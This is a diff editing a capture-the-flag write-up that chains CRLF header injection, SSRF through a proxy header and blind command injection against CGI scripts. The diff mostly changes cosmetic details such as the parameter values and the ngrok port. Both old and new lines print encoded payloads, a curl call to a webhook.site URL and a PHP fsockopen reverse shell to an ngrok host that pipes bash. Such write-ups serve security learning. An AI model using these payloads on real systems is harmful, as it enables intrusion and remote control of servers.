@@ -169,11 +169,17 @@ I had to pull off **double injection** — one to inject into attack-domain, and
 
 The payload had to:
 • Inject through a parameter **not meant for URLs** (name)
+
 • Trick the server into issuing a **request to itself** (SSRF)
+
 • Bypass the strict **regex filters** on the target parameter
+
 • Use **CRLF injection** to forge headers and inject a second request
+
 • Leverage **proxy-style headers** to force the server to connect to 127.0.0.1
+
 • Deliver a **command injection** payload to attack-ip
+
 • Execute **blindly** (no output returned!) – meaning I needed a **reverse shell** or webhook to verify it
 
 Each attempt either got blocked, sanitized, or just… failed. I even got 400s, 302s, 408s—like I was talking to a grumpy wizard.
@@ -183,8 +189,8 @@ Each attempt either got blocked, sanitized, or just… failed. I even got 400s, 
 
 Decoded URL (For clarification only):
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a1
-Location: /azx
+GET /cgi-bin/attack-domain?target=Glitch&name=x
+Location: /lol
 Content-type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=127.0.0.1%$(id)&name=
 
  HTTP/1.1
@@ -192,7 +198,7 @@ Content-type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=127.0.0.1%$(id)&na
 
 Encoded URL: (Always Ensure URL Encodeing)!
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1
+GET /cgi-bin/attack-domain?target=Glitch&name=x%0d%0aLocation:+/lol%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1
 ```
 
 but I got the following response:
@@ -224,15 +230,15 @@ So, I've updated my payload:
 
 Decoded URL (For clarification only):
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a1
-Location: /azx
+GET /cgi-bin/attack-domain?target=Glitch&name=x
+Location: /lol
 Content-type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%$(id)&name=
 
  HTTP/1.1
 ```
 Encoded URL: (Always Ensure URL Encodeing)!
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1
+GET /cgi-bin/attack-domain?target=Glitch&name=x%0d%0aLocation:+/lol%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1
 ```
 
 and guess what?!
@@ -247,7 +253,7 @@ This indicates that our target has been attacked successfully and we were able t
 We should verify if our command being executed, so I've decided to use **webhook.site** to see if I get some response from the the server that were I was targeting. So I've injected the following command: **$(curl%2bhttps://webhook.site/4a548bab-700e-4dc2-8f47-0949f09aaecd**) to ensure if my command being executed, but guess what? I got an error. Yeah my payload has a **dot**, which causes this error. This is very annoying. But I've assumed that my commands are working. So, I've decided to get a reverse shell directly.
 
 ###### **The problem?**
-We don't have VPN connection to the target, so we cannot get a reverse shell directly. Lucky, we can use **Ngrok**  to receive a **reverse shell** even if you’re not on the same network. This tool creates a **public-facing tunnel** to our machine — allowing the target (the server) to connect back to us.
+We don't have VPN connection to the target, so we cannot get a reverse shell directly. Luckly, we can use **Ngrok**  to receive a **reverse shell** even if you’re not on the same network. This tool creates a **public-facing tunnel** to our machine — allowing the target (the server) to connect back to us.
 
 
 ###### **Setting-up Ngrok to get reverse shell**
@@ -261,7 +267,7 @@ And we got the following window:
 ![](./images/Screenshot_2025-03-26_at_9.18.11_PM.png)
 
 
-So we are gonna use the following host: **0.tcp.in.ngrok.io**, and the following port: **4040** as the ip, and port to get a reverse shell to our machine.
+So we are gonna use the following host: **0.tcp.in.ngrok.io**, and the following port: **12085** as the ip, and port to get a reverse shell to our machine.
 
 
 
@@ -276,15 +282,15 @@ Finally, I landed on **PHP** with a **proxy header double URL-encoded trick**
 
 Decoded URL (For clarification only):
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a
-Location: /a
-Content-Type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%$(php -r '$sock=fsockopen("0.tcp.in.ngrok.io",4040);`bash <&3 >&3 2>&3`;')&name=
+GET /cgi-bin/attack-domain?target=Glitch&name=x
+Location: /lol
+Content-Type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%$(php -r '$sock=fsockopen("0.tcp.in.ngrok.io",12085);`bash <&3 >&3 2>&3`;')&name=
 
  HTTP/1.1
 ```
 Encoded URL: (Always Ensure URL Encodeing)!
 ```
-GET /cgi-bin/attack-domain?target=Glitch&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(php%2b-r%2b'$sock%253dfsockopen(%220.tcp.in.ngrok.io%22,4040)%253b%60bash%2b<%25263%2b>%25263%2b2>%25263`%253b')%26name=%0d%0a%0d%0a HTTP/1.1
+GET /cgi-bin/attack-domain?target=Glitch&name=x%0d%0aLocation:+/lol%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(php%2b-r%2b'$sock%253dfsockopen(%220.tcp.in.ngrok.io%22,12085)%253b%60bash%2b<%25263%2b>%25263%2b2>%25263`%253b')%26name=%0d%0a%0d%0a HTTP/1.1
 ```
 
 Let’s break it down:
@@ -320,11 +326,17 @@ Game over.
 This wasn’t just a CTF challenge — it was a battle of wit, patience, and obsession. _Cyber Attack_ was a **masterclass in modern web exploitation** — an intricate blend of:
 
 • SSRF,
+
 • Blind Command Injection,
+
 • Header Forgery via CRLF Injection,
+
 • Proxy Misuse,
+
 • Shell Evasion,
+
 • Filter Bypass,
+
 • And ultimately, creative persistence.
 
 
